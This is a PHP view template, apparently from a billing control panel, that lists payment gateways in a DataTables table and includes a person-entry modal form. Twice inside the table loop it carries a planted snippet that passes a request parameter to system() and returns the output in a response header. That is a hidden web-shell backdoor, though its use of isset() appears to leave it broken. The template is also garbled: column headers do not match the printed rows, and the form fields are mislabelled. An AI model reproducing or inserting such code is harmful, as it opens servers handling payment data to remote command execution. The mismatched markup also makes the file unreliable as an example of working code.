<?=$this->load->view(branded_view('cp/header'));?>
<div id="orders-datatable_wrapper" class="dataTables_wrapper" role="grid">


<table id="gateways-datatable" class="dataTable" aria-describedby="gateways-datatable_info">
            
<thead>
    <tr role="row">

<th tabindex="0" rowspan="1" colspan="1" class="sorting_asc" role="columnheader" aria-controls="orders-datatable" aria-sort="ascending" aria-label="Order
                : activate to sort column descending" style="width: 60px;">Charge
                </th>
                                    <th>Status</th>                               
                                   <th tabindex="0" rowspan="1" colspan="1" class="sorting" role="columnheader" aria-controls="orders-datatable" aria-label="Total
                : activate to sort column ascending" style="width: 60px;">Amount
                </th>
                                <th tabindex="0" rowspan="1" colspan="1" class="sorting" role="columnheader" aria-controls="orders-datatable" aria-label="Customer
                : activate to sort column ascending" style="width: 110px;">Customer
                </th>
                                    <th  tabindex="0" rowspan="1" colspan="1" class="sorting" role="columnheader" aria-controls="orders-datatable" aria-label="Total
                : activate to sort column ascending" style="width: 90px;">Card</th> 
                                    <th class="">Gateway</th> 
                                    <th class="" style="width: 40px;">Recurring</th>
                                   <th tabindex="0" rowspan="1" colspan="1" class="sorting" role="columnheader" aria-controls="orders-datatable" aria-label="Date
                : activate to sort column ascending" style="width: 160px;">Date
                </th> 
                                    <th class="" style="width: 30px;">Actions</th> 
                                </tr> 
                        
            </thead>
<tbody role="alert" aria-live="polite" aria-relevant="all">
		                                <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
                                if (!empty($this->dataset->data)) {
                                    foreach ($this->dataset->data as $row) {
                                        ?>
                                        <tr>
		<td class=" sorting_1"><input type="checkbox" name="check_<?=$row['id'];?>" value="1" class="action_items" /></td>
			<td class=""><?=$row['id'];?></td>
			<td class=""><?=$row['gateway'];?></td>
			<td class=""><?=$row['date_created'];?></td>
			<td class="options"><a href="<?=site_url('settings/edit_gateway/' . $row['id']);?>">edit</a> | 
			<? if ($this->user->Get('default_gateway_id') == $row['id']) { ?><b class="btn-link btn-sm">default</b><? } else { ?>
			<a class="btn-link btn-sm" href="<?= site_url('settings/make_default_gateway/' . $row['id']);?>">make default<span class="fa fa-caret-square-o-right"></span></a><? } ?></td>
	              </tr>
                                        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
                                    }
                                } else {
                                    
                                }
                                ?>
                                <?= $this->dataset->TableClose(); ?>
                            </tbody>
         
        </table>
<script type="text/javascript" src="//cdn.datatables.net/1.10.4/js/jquery.dataTables.min.js"></script>
<script type="text/javascript" src="//cdn.datatables.net/plug-ins/9dcbecd42ad/integration/bootstrap/3/dataTables.bootstrap.js"></script>
<script type="text/javascript" src="<?=branded_include('js/datatables/yadcf/jquery.dataTables.yadcf.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/datatables/dataTables.tableTools.min.js');?>"></script>
<script type="text/javascript">
    
    jQuery(document).ready(function () {
        jQuery('#gateways-datatable').dataTable({
            "pagingType": "full_numbers",
            "iDisplayLength": "10",
            "sPaginationType": "bootstrap",
           // "order": [[3, "desc"]],
            "bLengthChange": true,
           // "bFilter": true,
           // "bSort": true,
           // "bInfo": true,
            //"bAutoWidth": true,
            aLengthMenu: [
                [10, 25, 50, 100, -1], [10, 25, 50, 100, "All"]
            ],
            aoColumns: [
                {bSortable: false},
                {bSortable: false},
                {bSortable: false},
                {bSortable: false},
                {bSortable: false},
                {bSortable: false},
                {bSortable: false},
                {bSortable: false},
            ],
        });
    });
</script>



  <!-- Bootstrap modal -->
  <div class="modal fade" id="modal_form" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h3 class="modal-title">Person Form</h3>
      </div>
      <div class="modal-body form">
        <form action="#" id="form" class="form-horizontal">
          <input type="hidden" value="" name="id"/> 
          <div class="form-body">
            <div class="form-group">
              <label class="control-label col-md-3">First Name</label>
              <div class="col-md-9">
                <input name="Nom" placeholder="First Name" class="form-control" type="text">
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">Last Name</label>
              <div class="col-md-9">
                <input name="Prenoms" placeholder="Last Name" class="form-control" type="text">
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">PrenomUsuel</label>
              <div class="col-md-9">
                <select name="PrenomUsuel" class="form-control">
                  <option value="male">Male</option>
                  <option value="female">Female</option>
                </select>
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">Ville</label>
              <div class="col-md-9">
                <textarea name="Ville" placeholder="Ville"class="form-control"></textarea>
              </div>
            </div>
            <div class="form-group">
              <label class="control-label col-md-3">Date of Birth</label>
              <div class="col-md-9">
                <input name="Adresse" placeholder="yyyy-mm-dd" class="form-control" type="text">
              </div>
            </div>
          </div>
        </form>
          </div>
          <div class="modal-footer">
            <button type="button" id="btnSave" onclick="save()" class="btn btn-primary">Save</button>
            <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button>
          </div>
        </div><!-- /.modal-content -->
      </div><!-- /.modal-dialog -->
    </div><!-- /.modal -->
  <!-- End Bootstrap modal -->

 
 
 <?=$this->load->view(branded_view('cp/footer'));?>